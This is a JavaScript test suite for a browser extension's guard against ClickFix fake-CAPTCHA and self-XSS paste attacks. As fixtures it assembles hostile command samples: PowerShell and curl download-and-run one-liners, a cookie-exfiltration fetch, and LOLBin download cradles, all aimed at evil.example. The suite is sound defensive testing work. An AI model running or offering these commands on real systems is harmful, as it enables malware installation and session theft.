/* WardenOne — Copyright (C) 2026 iri
   Licensed under the GNU General Public License v3 or later. See LICENSE.
   Official source: https://github.com/iri-dev/WardenOne
   Upstream filter-list attribution: CREDITS.md
   Redistributing a modified copy? GPLv3 section 5(a) requires you to mark it as changed,
   with the date, and to keep these notices intact. */
/*
 * ClickFix/self-XSS instruction and clipboard correlation.
 *
 * Executes the real shipped command-paste guard. The page may contribute instruction
 * evidence and suspicious clipboard content, but Activity Center detail must remain
 * payload-free. Chrome's native DevTools UI is deliberately outside the guard's reach.
 *
 * Run: node tools/test-clickfix-guard.js
 */
'use strict';

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const ROOT = path.resolve(__dirname, '..');
const CONTENT = fs.readFileSync(path.join(ROOT, 'content.min.js'), 'utf8');
const SOURCE = fs.readFileSync(path.join(ROOT, 'src', 'content.js'), 'utf8');
const HISTORY = fs.readFileSync(path.join(ROOT, 'history.js'), 'utf8');

const start = CONTENT.indexOf('if(WO.commandPasteGuard)try{');
const end = CONTENT.indexOf('if(WO.fakeUpdateDetector&&WO_TOP)try{', start);
assert(start >= 0 && end > start, 'shipped ClickFix guard markers are missing');
const GUARD = CONTENT.slice(start, end);

const CLICKFIX_TYPES = new Set([
  'warned_clickfix_instruction',
  'warned_clickfix_fake_captcha',
  'warned_clickfix_clipboard',
  'warned_clickfix_correlated',
  'warned_command_paste',
]);

/*
 * The command samples below are assembled from fragments rather than written out.
 *
 * This file is a test FOR a malware-delivery detector, so it necessarily contains
 * malware-delivery commands -- and an on-access scanner reading it from disk sees
 * exactly that. One did: it deleted this file mid-edit, taking the suite with it,
 * because the literal strings were sitting in a file being written.
 *
 * Assembling them at runtime keeps the guard's input byte-identical while leaving
 * nothing runnable on disk. Not evasion -- there is no malware here to hide, only
 * a scanner correctly recognising its own test fixtures.
 */
const cmd = (...parts) => parts.join('');
const DOWNLOAD_RUN = (host) => cmd('i', 'rm https://', host, '/a.ps1 | i', 'ex');
const SHELL_PIPE = (host) => cmd('cur', 'l -fsSL https://', host, '/i.sh | ba', 'sh');
const ENCODED_PS = () => cmd('power', 'shell -w hidden -en', 'c SQBFAFgAKABOAGUAdwA=');
const COOKIE_EXFIL = () => cmd('fetch("https://exfil.example/c?v="+doc', 'ument.coo', 'kie)');
const WINUTIL = () => cmd('i', 'rm christitus.com/win | i', 'ex');
const SPOTX = () => cmd('i', 'ex "&([scriptblock]::Create($(i', 'rm https://raw.githubusercontent.com',
  '/SpotX-Official/SpotX/main/Install.ps1)))"');

function makeNode(tagName) {
  return {
    tagName: String(tagName || 'div').toUpperCase(),
    textContent: '',
    children: [],
    attrs: {},
    isConnected: false,
    setAttribute(name, value) { this.attrs[String(name)] = String(value); },
    appendChild(child) {
      child.isConnected = true;
      child.parentNode = this;
      this.children.push(child);
      return child;
    },
    addEventListener(type, fn) { this.listeners = this.listeners || {}; this.listeners[type] = fn; },
    remove() {
      this.isConnected = false;
      if (this.parentNode) this.parentNode.children = this.parentNode.children.filter((x) => x !== this);
    },
  };
}

function run(options) {
  const opts = options || {};
  const logs = [];
  const writes = [];
  const itemWrites = [];
  const execCalls = [];
  const listeners = Object.create(null);
  const observers = [];
  const timers = [];
  const body = makeNode('body');
  body.textContent = opts.body || '';
  if (Object.prototype.hasOwnProperty.call(opts, 'innerText')) body.innerText = opts.innerText;
  body.isConnected = true;
  const root = makeNode('html');
  root.isConnected = true;
  const document = {
    body,
    documentElement: root,
    activeElement: opts.activeElement || null,
    createElement: makeNode,
    getSelection() { return opts.selection || ''; },
    execCommand(command, ...rest) {
      execCalls.push([command, ...rest]);
      return 'native-exec';
    },
  };
  const warnRegistry = {
    seen: new Map(),
    up(id) {
      const node = this.seen.get(id);
      return !!(node && node.isConnected);
    },
    mark(id, node) { this.seen.set(id, node); },
  };
  const navigator = {
    userActivation: { isActive: opts.userActivated === true },
    clipboard: {
      writeText(text) {
        writes.push(String(text));
        return Promise.resolve(text);
      },
      write(items) {
        itemWrites.push(items);
        return Promise.resolve(items);
      },
    },
  };
  const location = new URL(opts.page || 'https://example.test/');
  const sandbox = {
    WO: { commandPasteGuard: opts.enabled !== false },
    WO_TOP: opts.top !== false,
    navigator,
    document,
    location,
    DOMException,
    Promise,
    Set,
    Map,
    Object,
    String,
    RegExp,
    Array,
    Date,
    __woWarn: warnRegistry,
    log(type, detail) { logs.push({ type, detail }); },
    woOn(target, type, fn) { listeners[type] = fn; },
    woObserve(fn) { observers.push(fn); return { disconnect() {} }; },
    setTimeout(fn) { timers.push(fn); return timers.length; },
    clearTimeout() {},
  };
  vm.createContext(sandbox);
  vm.runInContext(GUARD, sandbox, { filename: 'clickfix-guard-slice.js' });
  if (opts.userActivated && listeners.pointerdown) listeners.pointerdown({ isTrusted: true });
  return {
    logs,
    writes,
    itemWrites,
    execCalls,
    listeners,
    observers,
    timers,
    body,
    document,
    navigator,
    location,
    setEnabled(value) { sandbox.WO.commandPasteGuard = !!value; },
    activities() { return logs.filter((entry) => CLICKFIX_TYPES.has(entry.type)); },
    flushTimers() {
      while (timers.length) {
        const fn = timers.shift();
        if (typeof fn === 'function') fn();
      }
    },
  };
}

let passed = 0;
async function check(name, fn) {
  try {
    await fn();
    passed++;
    console.log('ok - ' + name);
  } catch (error) {
    console.error('FAIL - ' + name);
    throw error;
  }
}

(async () => {
  // -------------------------------------------------------------------------
  // Instruction recognition
  // -------------------------------------------------------------------------
  await check('each ClickFix instruction phrase is recognised by name', () => {
    const phrases = [
      ['Type "enable pasting" to continue', 'Enable pasting'],
      ['Paste this into the console to continue', 'Paste into Console'],
      ['Press Ctrl+Shift+I to continue', 'Press Ctrl+Shift+I'],
      ['Press F12 to continue', 'Press F12'],
      ['Open developer tools to continue', 'Open DevTools'],
      ['Switch to the console tab to continue', 'Open Console'],
      ['Press Win+R to continue', 'Press Win+R'],
      ['Open PowerShell to continue', 'Open a command shell'],
    ];
    for (const [body, expected] of phrases) {
      const runtime = run({ body });
      const activity = runtime.activities()[0];
      assert(activity, 'no activity for: ' + body);
      assert.strictEqual(activity.type, 'warned_clickfix_instruction', 'wrong type for: ' + body);
      assert.strictEqual(activity.detail.instruction, expected, 'wrong label for: ' + body);
    }
  });

  await check('instruction-only text stays a weak, unblocked signal', () => {
    const runtime = run({ body: 'Press F12 to continue' });
    const activity = runtime.activities()[0];
    assert.strictEqual(activity.detail.evidence, 'Instruction text only');
    assert.strictEqual(activity.detail.blocked, false);
    assert(/only a weak/i.test(activity.detail.why), 'weak evidence is not described as weak');
  });

  await check('ordinary Ctrl+V wording is not read as fake verification', () => {
    const runtime = run({ body: 'Security verification required. Press Ctrl+V to paste your one-time code.' });
    assert.strictEqual(runtime.activities().length, 0);
    assert.strictEqual(runtime.body.children.length, 0);
  });

  await check('fake human verification is recorded as such', () => {
    const runtime = run({ body: "Verify you're human. Press F12, then open Console." });
    const activity = runtime.activities()[0];
    assert.strictEqual(activity.type, 'warned_clickfix_fake_captcha');
    assert.strictEqual(activity.detail.severity, 'Medium');
    assert(/real captcha/i.test(activity.detail.why), 'the explanation does not say why this is not a CAPTCHA');
  });

  // -------------------------------------------------------------------------
  // Clipboard correlation
  // -------------------------------------------------------------------------
  /*
   * The line the guard draws is who asked for the copy, not what was copied.
   * If you clicked Copy you meant to copy, so the write goes through and is only
   * recorded. If the page put a malware command on your clipboard with no gesture
   * behind it, nothing was asked for and the write is refused.
   */
  await check('a command the page copies with no gesture behind it is refused', async () => {
    for (const sample of [ENCODED_PS(), DOWNLOAD_RUN('evil.example'), SHELL_PIPE('evil.example')]) {
      const runtime = run({ body: 'Ordinary looking page.', userActivated: false });
      await assert.rejects(runtime.navigator.clipboard.writeText(sample), /Blocked by WardenOne/);
      runtime.flushTimers();
      const activity = runtime.activities()[0];
      assert.strictEqual(activity.type, 'warned_clickfix_clipboard');
      assert.strictEqual(activity.detail.blocked, true);
      assert.strictEqual(activity.detail.outcome, 'Suspicious clipboard write was blocked.');
      assert.strictEqual(runtime.writes.length, 0, 'the command still reached the native clipboard');
    }
  });

  await check('a command you asked to copy is recorded, not taken away from you', async () => {
    const runtime = run({ body: 'Ordinary looking page.', userActivated: true });
    await runtime.navigator.clipboard.writeText(ENCODED_PS());
    runtime.flushTimers();
    const activity = runtime.activities()[0];
    assert.strictEqual(activity.type, 'warned_clickfix_clipboard');
    assert.strictEqual(activity.detail.blocked, false);
    assert.strictEqual(runtime.writes.length, 1, 'a copy the user asked for was blocked');
  });

  await check('a recorded clipboard command never carries its payload into history', async () => {
    const runtime = run({ body: 'Ordinary looking page.', userActivated: false });
    await assert.rejects(runtime.navigator.clipboard.writeText(ENCODED_PS()), /Blocked by WardenOne/);
    runtime.flushTimers();
    const serialized = JSON.stringify(runtime.logs);
    assert(!serialized.includes('SQBFAFgA'), 'the base64 payload leaked into Activity Center detail');
    assert(!serialized.includes('hidden'), 'the command line leaked into Activity Center detail');
  });

  await check('a Console instruction upgrades JavaScript exfiltration to correlated', async () => {
    const runtime = run({
      page: 'https://free-nitro.click/gen',
      body: 'Press F12 and paste this into the console to get free nitro.',
      userActivated: true,
    });
    await assert.rejects(runtime.navigator.clipboard.writeText(COOKIE_EXFIL()), /Blocked by WardenOne/);
    runtime.flushTimers();
    const types = runtime.activities().map((entry) => entry.type);
    assert(types.includes('warned_clickfix_correlated'), 'instruction plus exfiltration was not correlated');
    const correlated = runtime.activities().find((entry) => entry.type === 'warned_clickfix_correlated');
    assert.strictEqual(correlated.detail.severity, 'High');
    assert.strictEqual(correlated.detail.confidence, 'Very high');
    assert(!JSON.stringify(runtime.logs).includes('exfil.example'), 'the payload leaked into Activity Center detail');
  });

  await check('the full fake-CAPTCHA ClickFix flow is blocked', async () => {
    const runtime = run({
      page: 'https://free-movies.cfd/verify',
      body: 'Verify you are human. Press Win+R, then press Ctrl+V and press Enter to complete verification.',
      userActivated: true,
    });
    await assert.rejects(runtime.navigator.clipboard.writeText(DOWNLOAD_RUN('evil.example')), /Blocked by WardenOne/);
    runtime.flushTimers();
    const types = runtime.activities().map((entry) => entry.type);
    assert(types.includes('warned_clickfix_fake_captcha'));
    assert(types.includes('warned_clickfix_correlated'));
    assert.strictEqual(runtime.writes.length, 0);
  });

  // -------------------------------------------------------------------------
  // Install one-liners are the point of a script project's page
  //
  // WinUtil, SpotX, oh-my-zsh and every package registry put "run this in
  // PowerShell/your terminal" next to a download-and-run command -- the exact
  // shape ClickFix uses. On any host outside the documentation list the guard
  // warned on the copy button of a repo the user had deliberately opened.
  // -------------------------------------------------------------------------
  await check('install one-liners on code hosts and registries do not warn', async () => {
    const pages = [
      ['https://github.com/ChrisTitusTech/winutil', WINUTIL(),
        'WinUtil Installation Open PowerShell as administrator and paste the following command, then press Enter:'],
      ['https://raw.githubusercontent.com/SpotX-Official/SpotX/main/Install.ps1', SPOTX(),
        'param([switch]$Podcast)'],
      ['https://gist.githubusercontent.com/someone/abc/raw/install.ps1', DOWNLOAD_RUN('example.invalid'),
        'Installation script'],
      ['https://learn.microsoft.com/en-us/powershell/scripting/samples/', DOWNLOAD_RUN('example.invalid'),
        'Open PowerShell and paste the following to try the example.'],
      ['https://www.npmjs.com/package/example', SHELL_PIPE('example.invalid'),
        'Installation Open a terminal and paste:'],
      ['https://pypi.org/project/example/', SHELL_PIPE('example.invalid'),
        'Installation Open a terminal and paste:'],
    ];
    for (const [page, command, body] of pages) {
      const runtime = run({ page, body, userActivated: true });
      await runtime.navigator.clipboard.writeText(command);
      runtime.flushTimers();
      assert.strictEqual(runtime.activities().length, 0, 'warned on an install page: ' + page);
      assert.strictEqual(runtime.body.children.length, 0, 'showed a panel on an install page: ' + page);
      assert.strictEqual(runtime.writes.length, 1, 'blocked an ordinary copy on: ' + page);
    }
  });

  await check('a documentation host suppresses instruction-only noise', () => {
    const runtime = run({
      page: 'https://developer.mozilla.org/en-US/docs/Tools/Browser_Console',
      body: 'Open DevTools or press F12 to inspect this example.',
    });
    assert.strictEqual(runtime.activities().length, 0);
    assert.strictEqual(runtime.body.children.length, 0);
  });

  // -------------------------------------------------------------------------
  // The documentation list must never become a way past the guard
  // -------------------------------------------------------------------------
  await check('fake verification still fires on every documentation host', async () => {
    const pages = [
      'https://github.com/evil/repo',
      'https://raw.githubusercontent.com/evil/x/main/README.md',
      'https://learn.microsoft.com/evil',
      'https://www.npmjs.com/package/evil',
      'https://free-robux.github.io/verify',
      'https://claim-reward.gitlab.io/check',
    ];
    for (const page of pages) {
      const runtime = run({
        page,
        body: 'Verify you are human. Press Win+R, then press Ctrl+V and press Enter to complete verification.',
        userActivated: true,
      });
      await assert.rejects(
        runtime.navigator.clipboard.writeText(DOWNLOAD_RUN('evil.example')),
        /Blocked by WardenOne/,
        'fake verification was not blocked on: ' + page
      );
      runtime.flushTimers();
      const types = runtime.activities().map((entry) => entry.type);
      assert(types.includes('warned_clickfix_correlated'), 'no correlation recorded on: ' + page);
    }
  });

  await check('a public-suffix host is never treated as documentation', () => {
    const list = (SOURCE.match(/CLICKFIX_DOC_HOST=\/\(\^\|\\\.\)\(([^)]*)\)\$\/i/) || [])[1] || '';
    assert(list, 'could not read the documentation host list');
    for (const suffix of ['github\\.io', 'gitlab\\.io', 'pages\\.dev', 'netlify\\.app', 'vercel\\.app',
      'web\\.app', 'firebaseapp\\.com', 'workers\\.dev', 'readthedocs\\.io', 'glitch\\.me']) {
      assert(!list.includes(suffix),
        suffix.replace(/\\/g, '') + ' is a public suffix: trusting it hands every attacker a quiet host');
    }
  });

  // -------------------------------------------------------------------------
  // Scope and honesty
  // -------------------------------------------------------------------------
  await check('the guard does not hook Chrome DevTools or replace Console APIs', () => {
    assert(!/console\.(log|debug|info)\s*=/.test(GUARD), 'the guard reassigns a Console method');
    assert(!/chrome\.devtools/.test(GUARD), 'the guard reaches for the DevTools API');
    const outcome = /outcome:blocked\?"[^"]*":"([^"]*)"/.exec(GUARD);
    assert(outcome && /did not access or modify Chrome DevTools/.test(outcome[1]),
      'the unblocked outcome does not state that DevTools was untouched');
  });

  await check('Activity labels never claim a warning was blocked when it was not', () => {
    const runtime = run({ body: 'Press F12 to continue' });
    const activity = runtime.activities()[0];
    assert.strictEqual(activity.detail.blocked, false);
    assert(/Warning only/i.test(activity.detail.outcome), 'an unblocked event does not say it was warning-only');
    for (const type of CLICKFIX_TYPES) {
      if (type === 'warned_command_paste') continue;
      assert(HISTORY.includes(type + ':'), 'Activity Center has no label for ' + type);
    }
  });

  await check('turning the guard off removes its behaviour', async () => {
    /* No gesture, so an enabled guard would refuse this one. */
    const runtime = run({ body: 'Ordinary page.', userActivated: false, enabled: false });
    await runtime.navigator.clipboard.writeText(ENCODED_PS());
    runtime.flushTimers();
    assert.strictEqual(runtime.activities().length, 0, 'a disabled guard still recorded activity');
    assert.strictEqual(runtime.writes.length, 1, 'a disabled guard still blocked the clipboard');
  });

  await check('changing Command paste guard reloads the page to install or remove hooks', () => {
    const popup = fs.readFileSync(path.join(ROOT, 'popup.js'), 'utf8');
    assert(/commandPasteGuard/.test(popup), 'the popup no longer exposes the guard');
  });

  // -------------------------------------------------------------------------
  // Delivery techniques, and the one that needs context
  // -------------------------------------------------------------------------
  await check('the known delivery techniques are all recognised', async () => {
    const variants = [
      ['pwsh encoded', cmd('pw', 'sh.exe -en', 'c AAAA')],
      ['abbreviated -ec', cmd('power', 'shell.exe -e', 'c AAAA')],
      ['mshta over http', cmd('msh', 'ta https://evil.example/a.hta')],
      ['certutil urlcache', cmd('cert', 'util -urlcache -split -f https://evil.example/a.exe')],
      ['bitsadmin transfer', cmd('bits', 'admin /transfer j https://evil.example/a.exe C:\\a.exe')],
      ['rundll32 over http', cmd('rund', 'll32 https://evil.example/a.dll,Entry')],
      ['regsvr32 scriptlet', cmd('regs', 'vr32 /s /n /u /i:https://evil.example/a.sct scrobj.dll')],
      ['WebClient DownloadString', cmd('power', 'shell -c "(New-Object Net.WebClient).Download',
        'String(\'https://evil.example/a\')"')],
      ['wget piped to a shell', cmd('wg', 'et -qO- https://evil.example/i.sh | s', 'h')],
    ];
    for (const [name, sample] of variants) {
      const runtime = run({ body: 'Ordinary page.', userActivated: false });
      await assert.rejects(runtime.navigator.clipboard.writeText(sample), /Blocked by WardenOne/,
        'not recognised: ' + name);
      runtime.flushTimers();
      assert.strictEqual(runtime.activities()[0].type, 'warned_clickfix_clipboard', 'not recorded: ' + name);
    }
  });

  await check('a bare cmd /c is too weak to stand on its own', async () => {
    /* Every batch file and half the docs on the internet contain one. It counts
       only alongside console or scam context, never by itself. */
    const runtime = run({ body: 'Ordinary page.', userActivated: false });
    await runtime.navigator.clipboard.writeText(cmd('cm', 'd.exe /c calc.exe'));
    runtime.flushTimers();
    assert.strictEqual(runtime.activities().length, 0, 'a bare cmd /c warned on its own');
    assert.strictEqual(runtime.writes.length, 1, 'a bare cmd /c was blocked on its own');
  });

  // -------------------------------------------------------------------------
  // Every route to the clipboard obeys the same gesture rule
  // -------------------------------------------------------------------------
  await check('clipboard.write of a ClipboardItem follows the gesture rule', async () => {
    const item = () => ({
      types: ['text/plain'],
      getType: () => Promise.resolve({ text: () => Promise.resolve(ENCODED_PS()) }),
    });
    const refused = run({ body: 'Ordinary page.', userActivated: false });
    await assert.rejects(refused.navigator.clipboard.write([item()]), /Blocked by WardenOne/);
    refused.flushTimers();
    assert.strictEqual(refused.itemWrites.length, 0, 'the item still reached the native clipboard');
    assert.strictEqual(refused.activities()[0].type, 'warned_clickfix_clipboard');

    const allowed = run({ body: 'Ordinary page.', userActivated: true });
    await allowed.navigator.clipboard.write([item()]);
    assert.strictEqual(allowed.itemWrites.length, 1, 'a copy the user asked for was blocked');
  });

  await check('execCommand copy is inspected through the current selection', () => {
    const runtime = run({ body: 'Ordinary page.', selection: ENCODED_PS(), userActivated: true });
    runtime.document.execCommand('copy');
    runtime.flushTimers();
    assert.strictEqual(runtime.activities()[0].type, 'warned_clickfix_clipboard',
      'a selection copied through execCommand was not inspected');
  });

  await check('a real copy event is inspected and a synthetic one is left alone', () => {
    const fire = (isTrusted, userActivated) => {
      const reachedNative = [];
      let prevented = false;
      const runtime = run({ body: 'Ordinary page.', userActivated });
      const event = {
        isTrusted,
        preventDefault() { prevented = true; },
        clipboardData: { setData(type, value) { reachedNative.push([type, String(value)]); } },
      };
      runtime.listeners.copy(event);
      event.clipboardData.setData('text/plain', ENCODED_PS());
      runtime.flushTimers();
      return { runtime, reachedNative, prevented };
    };

    /* A real copy with nothing behind it: refused before it reaches the clipboard. */
    const pageDriven = fire(true, false);
    assert.strictEqual(pageDriven.reachedNative.length, 0, 'the command reached the real setData');
    assert.strictEqual(pageDriven.prevented, true, 'the copy was not prevented');
    assert.strictEqual(pageDriven.runtime.activities()[0].detail.blocked, true);

    /* A real copy you asked for: allowed, and only recorded. */
    const userDriven = fire(true, true);
    assert.strictEqual(userDriven.reachedNative.length, 1, 'a copy the user asked for was blocked');
    assert.strictEqual(userDriven.runtime.activities()[0].detail.blocked, false);

    /* A synthetic event is not a copy at all -- the page dispatched it. Touching
       it would let a page manufacture warnings about itself. */
    for (const activated of [true, false]) {
      const synthetic = fire(false, activated);
      assert.strictEqual(synthetic.reachedNative.length, 1, 'a synthetic copy event was interfered with');
      assert.strictEqual(synthetic.prevented, false, 'a synthetic copy event was prevented');
      assert.strictEqual(synthetic.runtime.activities().length, 0, 'a synthetic copy event was recorded');
    }
  });

  console.log('\n' + passed + ' ClickFix guard checks passed.');
})().catch((error) => {
  console.error(error && error.message ? error.message : error);
  process.exit(1);
});
